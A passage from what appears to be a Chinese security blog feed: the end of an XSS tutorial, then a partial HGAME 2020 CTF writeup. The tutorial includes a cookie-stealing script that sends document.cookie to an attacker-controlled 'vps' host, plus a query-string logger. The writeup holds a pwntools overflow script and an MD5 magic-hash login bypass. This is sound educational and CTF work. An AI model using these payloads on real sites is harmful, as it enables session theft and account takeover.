title="存储型xss"></a>存储型xss</h3><p>存储型xss一出现在网站留言板，评论处，个人资料处等需要用户可以对网站写入数据的地方。攻击者写入一段窃取cookie的恶意JavaScript代码到评论处，这段恶意代码会写入数据库，当其他用户浏览这个写入代码的页面时，网站从数据库中读取恶意代码显示到网页中被浏览器执行，导致用户cookie被窃取，攻击者无需受害者密码即可登录账户，所以也被称作“持久性xss”。持久性xss比反射型xss危害要大的多</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss&#x3D;@$_POST[&#39;xss&#39;];</span><br><span class="line">mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123&quot;);</span><br><span class="line">mysql_select_db(&quot;xss&quot;);</span><br><span class="line">if($xss!&#x3D;&#x3D;null)&#123;</span><br><span class="line">    $sql&#x3D;&quot;insert into temp(id,payload) values(&#39;1&#39;,&#39;$xss&#39;)&quot;;</span><br><span class="line">    $result&#x3D;mysql_query($sql);</span><br><span class="line">    echo $result;</span><br><span class="line">&#125;  ?&gt;</span><br></pre></td></tr></table></figure><p>不直接显示在页面中，而是插入到了数据库，存储型 XSS 的执行位置通常不同于输入位置</p><p>存储型 XSS 的数据流向是：<code>浏览器-&gt; 后端-&gt; 数据库-&gt; 后端-&gt; 浏览器</code></p><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>DOM xss是基于dom文档对象模型，前端脚本通过dom动态修改页面，由于不与服务端进行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。常见的可以操纵dom的对象：URL，localtion,referrer等</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); &#x2F;&#x2F;禁用错误报告</span><br><span class="line">$name &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot; value&#x3D;&quot;&lt;?php echo $name;?&gt;&quot; &#x2F;&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;print&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">var text &#x3D; document.getElementById(&quot;text&quot;); </span><br><span class="line">var print &#x3D; document.getElementById(&quot;print&quot;);</span><br><span class="line">print.innerHTML &#x3D; text.value; &#x2F;&#x2F; 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><img src="/2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/TIM截图20200205203708.png" style="zoom: 50%;"><p>DOM型XSS的数据流向是：<code>URL--&gt;浏览器</code></p><h2 id="xss漏洞利用"><a href="#xss漏洞利用" class="headerlink" title="xss漏洞利用"></a>xss漏洞利用</h2><h3 id="盗cookie"><a href="#盗cookie" class="headerlink" title="盗cookie"></a>盗cookie</h3><p>可以在自己vps上简单搭一个，<code>index.php</code>写入下面内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;log.txt&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>].<span class="string">&quot;\n&quot;</span>,FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就会将请求的内容写入<code>log.txt</code>里了，可以构造类似下面的payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://vps/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="xss绕过payload"><a href="#xss绕过payload" class="headerlink" title="xss绕过payload"></a>xss绕过payload</h2><p><a href="https://xz.aliyun.com/t/2936">https://xz.aliyun.com/t/2936</a></p><p><a href="https://blog.csdn.net/qq_29277155/article/details/51320064">https://blog.csdn.net/qq_29277155/article/details/51320064</a></p><p><a href="https://www.freebuf.com/articles/web/153055.html">https://www.freebuf.com/articles/web/153055.html</a></p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><h3 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP?"></a>什么是CSP?</h3><p>CSP的全称Content Security Policy，用来防御XSS攻击的技术。它是一种由开发者定义的安全性政策性申明，通过CSP指定可信的内容来源，让WEB处于一个安全的运行环境中。</p><p>举个例子：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure><p>一个CSP头由多组CSP策略组成，中间由分号分隔，其中每一组策略包含一个策略指令和一个内容源列表</p><p>策略指令有如下选项：</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><p>内容源有如下选项：</p><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.foo.com</td><td>允许加载foo.com子域的资源</td></tr><tr><td>abc.foo.com</td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com/">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><p>内容源有三种：源列表、关键字和数据，其中<em>，</em>.foo.com，abc.foo.com，<a href="https://a.com/">https://a.com</a> ，https:属于源列表。’none’，’self’，’unsafe-inline’，’unsafe-eval’属于关键字。data:，mediastream:属于数据</p><p>这里有个CSP是否安全的检测网站：<a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com</a></p><h3 id="bypass-CSP"><a href="#bypass-CSP" class="headerlink" title="bypass CSP"></a>bypass CSP</h3><p><a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a></p><p><a href="https://xz.aliyun.com/t/5084">https://xz.aliyun.com/t/5084</a></p><p><a href="https://zhuanlan.zhihu.com/p/94246164?utm_source=com.tencent.tim&amp;utm_medium=social&amp;utm_oi=910631635467264000">https://zhuanlan.zhihu.com/p/94246164?utm_source=com.tencent.tim&amp;utm_medium=social&amp;utm_oi=910631635467264000</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2020比赛部分writeup</title>
      <link href="2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/"/>
      <url>2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<p>本篇博客记录了HGAME上web题目和misc题目的writeup！</p><a id="more"></a><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h4><p>打开提示github，还着重标了版本管理工具，git源码泄露也没恢复出神魔有用的东西</p><p>dirsearch扫下目录，发现好多和git相关的文件和目录</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200123173732.png" style="zoom:67%;"><p>在<code>/.git/config</code>目录下发现网站的github地址</p><p>也可以用githack(有两个)：<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p><p>而不是这个：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>将仓库信息还原下来，然后在有<code>.git</code>文件夹目录用<code>git remote -v</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200125185928.png" style="zoom: 80%;"><p>在<code>Commits</code>里的第二个找到base64编码的flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200123175420.png" style="zoom:67%;"><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开发现提示<code>You need to come from https://vidar.club/</code>，想到设置<code>Referer</code>，发现设置完还要设置<code>X-Forwarded-For</code>,<code>User-Agent</code>,请求方式改为<code>POST</code>,<code>If-Unmodified-Since</code>，最终请求</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200123175144.png" style="zoom: 67%;"><h4 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h4><p>打开发现跳到<code>new.php</code>并提示<code>403 Forbidden</code>，抓包看下，在请求根目录时发现提示<code>405 Not Allowed</code></p><p>搜了搜405的原因：Apache、IIS、Nginx等绝大多数web服务器，都不允许静态文件响应POST请求</p><p>解决：将post请求改为get请求</p><p>试着改下请求方式，改为POST发现</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200123180623.png" style="zoom:67%;"><p>提示要两个数相加为10，试了试发现GET和POST都要传参，要注意加号要url编码</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200123191120.png" style="zoom:67%;"><h4 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h4><p>很卡这题，打开抓下游戏之后的包，发现传递了一个参数，用|分割，前面猜测是分数，后面是Unix时间戳的MD5加密的值，不过好像没啥用，这里有个网站<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p><p>直接改前面的数就行</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200123182849.png" style="zoom:67%;"><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>是一串字符<code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code>，base64解密发现是摩斯密码，再解密得<code>W3LC0MEnullTOnull2020nullHGAM3</code>，将null替换成<code>_</code>并加上hgame{}得flag</p><h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>题目是一张图片，binwalk分离出压缩包，strings查看可显示字符，发现<code>Password is picture ID.</code>，这个图片是P站上的图片，搜一下图片名字，找了找发现也不对，爆破一下吧，发现id是8位数字</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200123193817.png" style="zoom:50%;"><p>成功爆破出来，解压发现是Unicode编码，解码得flag</p><h4 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h4><p>解压题目给的压缩包，发现<code>Bacon.txt</code>和<code>Novel.zip</code>两个文件，并且<code>Novel.zip</code>有和<code>Bacon.txt</code>一样的文件</p><p>猜测是明文攻击，提示用7-zip，所以我们用7-zip将<code>Bacon.txt</code>压缩作为明文</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200125172756.png" style="zoom: 80%;"><p>直接停止就行，虽然没找到密码，但已成功解压出来了</p><p>解压两个文件，<code>Bacon.txt</code>和<code>The Call of Cthulhu.doc</code>打开doc文件发现要密码，txt文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.</span><br><span class="line"></span><br><span class="line">*Password in capital letters.</span><br></pre></td></tr></table></figure><p>大小写字母交叉，显然是培根密码(五个一位，小写字母表示大写字母得加密结果，反之也成立)，替换成小写得<code>aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba</code></p><p>解密得<code>FLAGHIDDENINDOC</code>，输入密码打开，显示隐藏文字，得到flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200125174521.png" style="zoom:67%;"><h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>打开发现两个文件，一个加密的压缩包<code>OK.zip</code>，一个<code>password.txt</code></p><p>文本文件里记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Three fenses first, Five Caesar next. English sentense first,  zip password next.</span><br></pre></td></tr></table></figure><p>大概意思是先经过了三层栅栏密码，后经过5层凯撒密码，英语句子在前，压缩包密码在后</p><p>栅栏密码在线解密：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p><p>凯撒密码在线解密：<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><p>解密结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.</span><br><span class="line"></span><br><span class="line">EAVMUBAQHQMVEPDT</span><br></pre></td></tr></table></figure><p>第二个就是压缩包密码，解密之后得到Ook!加密，密文解密得base32的密文，去掉<code>data:text;base32,</code>，再解密得base64的密文</p><p>最后base64转图片，加上<code>data:image/png;base64,</code>，得二维码，扫码得flag</p><p>Ook!解密地址：<a href="https://tool.bugku.com/brainfuck/[](https://tool.bugku.com/brainfuck/)">https://tool.bugku.com/brainfuck/[](https://tool.bugku.com/brainfuck/)</a></p><p>base64转图片地址：<a href="http://tool.chinaz.com/tools/imgtobase">http://tool.chinaz.com/tools/imgtobase</a></p><h4 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h4><p>打开发现是个流量包，导出HTTP对象，发现有一个很大的文件</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200125171406.png" style="zoom:67%;"><p>将其保存，binwalk分离出一个加密得压缩包，查看属性时发现</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200125175048.png" style="zoom:67%;"><p>ARCHPR破解出密码为<code>759371</code>，解压得到<code>I Love Mondays.mp3</code></p><p>查看频谱图得到flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200125181832.png" style="zoom:67%;"><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>ida反编译代码</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200126125227.png" style="zoom: 80%;"><p><code>s</code>和<code>v5</code>相差123，所以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">cn=remote(<span class="string">&#x27;47.103.214.163&#x27;</span>,<span class="number">20000</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">123</span>+<span class="string">&#x27;0O0o\0O0&#x27;</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h4><p>打开发现跳转到<code>?action=login.php</code>，想到了文件包含，<code>php://filter</code>读源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&#39;debug&#39;])) &#123;</span><br><span class="line">        $debug &#x3D; $_GET[&#39;debug&#39;];</span><br><span class="line">        if (!preg_match(&quot;&#x2F;^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$&#x2F;&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">        if ($admin_password &#x3D;&#x3D; md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; $admin_username)&#123;</span><br><span class="line">            $_SESSION[&#39;username&#39;] &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;用户名或密码错误&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;title&gt;Cosmos的博客后台&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;signin.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;sticky-footer.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;form class&#x3D;&quot;form-signin&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;login.php&quot;&gt;</span><br><span class="line">        &lt;h2 class&#x3D;&quot;form-signin-heading&quot;&gt;后台登陆&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;用户名&quot; required autofocus&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;密码&quot; required&gt;</span><br><span class="line">        &lt;input class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;footer class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;text-muted&quot;&gt;Created by Annevi&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;footer&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>查看源码，发现可以用可变变量查看<code>username</code>，而<code>password</code>的MD5又是0e开头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?debug&#x3D;admin_username&#x2F;&#x2F;读取用户名</span><br></pre></td></tr></table></figure><p>现在我们就可以登陆了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:username&#x3D;Cosmos!&amp;password&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure><p>再按之前的方式读下<code>admin.php</code>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&#39;Location: index.php&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&#39;img_url&#39;])) &#123;</span><br><span class="line">        $img_url &#x3D; @$_POST[&#39;img_url&#39;];</span><br><span class="line">        $url_array &#x3D; parse_url($img_url);</span><br><span class="line">        if (@$url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c &#x3D; curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res 